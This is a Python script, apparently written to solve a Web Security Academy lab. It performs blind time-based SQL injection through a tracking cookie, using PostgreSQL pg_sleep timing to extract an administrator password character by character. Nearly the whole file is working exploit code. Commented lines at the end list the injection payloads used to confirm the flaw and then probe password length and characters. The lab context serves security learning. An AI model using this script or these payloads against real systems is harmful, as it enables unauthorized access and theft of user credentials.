import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# Target URL
target_url = "https://YOUR-ID.web-security-academy.net/"
cookie_template = "YOUR-TRACKING-ID'||(SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{pos},1)='{char}')+THEN pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users)--"
session_cookie = "YOUR-SESSION"

# All possible characters (a-z and 0-9)
characters = string.ascii_lowercase + string.digits

# Measure response time
def get_response_time(position, char):
    cookies = {
        "TrackingId": cookie_template.format(pos=position, char=char),
        "session": session_cookie
    }
    start_time = time.time()
    response = requests.get(target_url, cookies=cookies)
    end_time = time.time()
    return char, end_time - start_time

# Find best match for a given position
def find_char_for_position(position):
    response_times = {}
    max_workers = min(5, len(characters))  # Reduce thread count
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(get_response_time, position, char): char for char in characters}
        
        for future in as_completed(futures):
            char, response_time = future.result()
            response_times[char] = response_time

    best_match = max(response_times, key=response_times.get)
    print(f"[!] Found character '{best_match}' for position {position} (response time: {response_times[best_match]:.2f}s)")
    return best_match

# Password extraction
password = ""
for pos in range(1, 21):
    print(f"[*] Testing position {pos} [a-z0-9]")
    password += find_char_for_position(pos)

print(f"[+] Extracted password: {password}")





# '||(SELECT+CASE+WHEN+(2=2)+THEN pg_sleep(5)+ELSE+pg_sleep(0)+END)--
# '||(SELECT+CASE+WHEN+(2=2)+THEN pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users)--
# '||(SELECT+CASE+WHEN+(username='administrator')+THEN pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users)--
# '||(SELECT+CASE+WHEN+(username='administrator'+AND+LENGTH+(password)>1)+THEN pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users)--
# '||(SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users)--
